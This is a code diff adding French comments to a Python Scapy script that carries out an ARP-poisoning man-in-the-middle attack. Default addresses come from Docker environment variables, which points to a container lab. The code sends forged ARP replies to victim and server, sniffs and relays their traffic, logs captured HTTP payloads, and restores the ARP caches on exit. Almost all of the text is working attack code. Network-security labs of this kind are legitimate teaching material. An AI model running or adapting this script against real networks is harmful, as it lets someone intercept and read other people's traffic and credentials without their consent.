@@ -1,3 +1,4 @@
+# D'abord je rassemble tous les imports utiles pour piloter Scapy et orchestrer les threads.
 import os
 import signal
 import sys
@@ -6,6 +7,7 @@ import time
 from pathlib import Path
 from typing import Optional
 
+# Ensuite je prends Scapy, parce que je veux manier directement les trames Ethernet et ARP sans filtre.
 from scapy.all import (  # type: ignore[import-not-found]
     ARP,
     Ether,
@@ -19,21 +21,26 @@ from scapy.all import (  # type: ignore[import-not-found]
     srp,
 )
 
+# Je récupère les paramètres envoyés par Docker pour savoir qui est qui sur le réseau.
 VICTIM_IP = os.environ.get("VICTIM_IP", "172.28.0.20")
 SERVER_IP = os.environ.get("SERVER_IP", "172.28.0.10")
 INTERFACE = os.environ.get("ATTACK_INTERFACE", conf.iface)
 
+# Je fixe un rythme par défaut pour l'empoisonnement, tout en laissant la possibilité de l'ajuster.
 POISON_INTERVAL = float(os.environ.get("POISON_INTERVAL", "2"))
 LOG_PREFIX = "[ATTACKER]"
 
+# Je pose un événement global pour arrêter proprement les threads.
 stop_event = threading.Event()
 
 
 def log(message: str) -> None:
+    """Cette fonction centralise l'affichage des traces pour conserver le préfixe commun et forcer le flush immédiat."""
     print(f"{LOG_PREFIX} {message}", flush=True)
 
 
 def enable_ip_forwarding() -> None:
+    """Tente d'activer l'IP forwarding noyau pour déléguer au système le relais des paquets quand c'est permis."""
     try:
         Path("/proc/sys/net/ipv4/ip_forward").write_text("1", encoding="ascii")
         log("enabled IPv4 forwarding")
@@ -42,6 +49,7 @@ def enable_ip_forwarding() -> None:
 
 
 def resolve_mac(target_ip: str, iface: str) -> str:
+    """Envoie des requêtes ARP who-has pour récupérer l'adresse MAC associée à l'IP ciblée sur l'interface donnée."""
     log(f"resolving MAC address for {target_ip}")
     packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=target_ip)
     answered, _ = srp(packet, timeout=2, retry=3, iface=iface, verbose=0)
@@ -53,6 +61,7 @@ def resolve_mac(target_ip: str, iface: str) -> str:
 
 
 def poison_arp(victim_mac: str, server_mac: str, attacker_mac: str) -> None:
+    """Diffuse en boucle deux réponses ARP falsifiées pour que victime et serveur me croient à l'autre bout."""
     log("starting ARP poisoning loop")
     frame_to_victim = Ether(dst=victim_mac, src=attacker_mac) / ARP(
         op=2, pdst=VICTIM_IP, hwdst=victim_mac, psrc=SERVER_IP, hwsrc=attacker_mac
@@ -61,6 +70,7 @@ def poison_arp(victim_mac: str, server_mac: str, attacker_mac: str) -> None:
         op=2, pdst=SERVER_IP, hwdst=server_mac, psrc=VICTIM_IP, hwsrc=attacker_mac
     )
     while not stop_event.is_set():
+        # J'ai envoyé les deux paquets régulièrement pour garder les caches ARP contaminés.
         sendp(frame_to_victim, verbose=0, iface=INTERFACE)
         sendp(frame_to_server, verbose=0, iface=INTERFACE)
         time.sleep(POISON_INTERVAL)
@@ -68,7 +78,7 @@ def poison_arp(victim_mac: str, server_mac: str, attacker_mac: str) -> None:
 
 
 def restore_arp(victim_mac: str, server_mac: str) -> None:
-    log("restoring ARP tables")
+    """Réémet des annonces ARP légitimes côté victime et serveur afin de rendre leurs caches cohérents avant de quitter."""
     sendp(
         Ether(dst=victim_mac, src=server_mac)
         / ARP(op=2, pdst=VICTIM_IP, hwdst=victim_mac, psrc=SERVER_IP, hwsrc=server_mac),
@@ -88,12 +98,14 @@ def restore_arp(victim_mac: str, server_mac: str) -> None:
 
 
 def describe_payload(payload: bytes) -> str:
+    """Fabrique un aperçu lisible du payload HTTP en gardant seulement la première ligne pour les logs."""
     text = payload.decode("utf-8", errors="replace")
     first_line = text.splitlines()[0] if text else ""
     return first_line[:120]
 
 
 def forward_packet(packet, victim_mac: str, server_mac: str, attacker_mac: str) -> None:
+    """Filtre les paquets IP MITM, logge les échanges HTTP et réexpédie la charge utile avec une entête Ethernet forgée."""
     if IP not in packet or Ether not in packet:
         return
     if packet[Ether].src == attacker_mac:
@@ -119,11 +131,13 @@ def forward_packet(packet, victim_mac: str, server_mac: str, attacker_mac: str) 
             payload_preview = describe_payload(packet[Raw].load)
             log(f"captured HTTP {direction} seq={packet[TCP].seq} data=\"{payload_preview}\"")
 
+    # J'ai repeint l'entête Ethernet pour que le paquet reparte vers la bonne cible.
     new_packet = Ether(src=attacker_mac, dst=dst_mac) / packet[IP]
     sendp(new_packet, iface=INTERFACE, verbose=0)
 
 
 def sniff_packets(victim_mac: str, server_mac: str, attacker_mac: str) -> None:
+    """Démarre le sniffer Scapy sur l'interface et redirige chaque paquet pertinent vers le handler MITM."""
     log("starting packet sniffer")
 
     def handler(pkt):
@@ -139,6 +153,7 @@ def sniff_packets(victim_mac: str, server_mac: str, attacker_mac: str) -> None:
 
 
 def handle_signals(victim_mac: str, server_mac: str) -> None:
+    """Arme des handlers SIGINT/SIGTERM pour déclencher l'arrêt propre et la restitution des tables ARP."""
     def _handler(signum, _frame):
         log(f"received signal {signum}, stopping")
         stop_event.set()
@@ -150,6 +165,7 @@ def handle_signals(victim_mac: str, server_mac: str) -> None:
 
 
 def main() -> None:
+    """Pilote tout le cycle de vie de l'attaquant : résolution des cibles, empoisonnement ARP, sniffing et nettoyage final."""
     conf.iface = INTERFACE
     conf.verb = 0
 
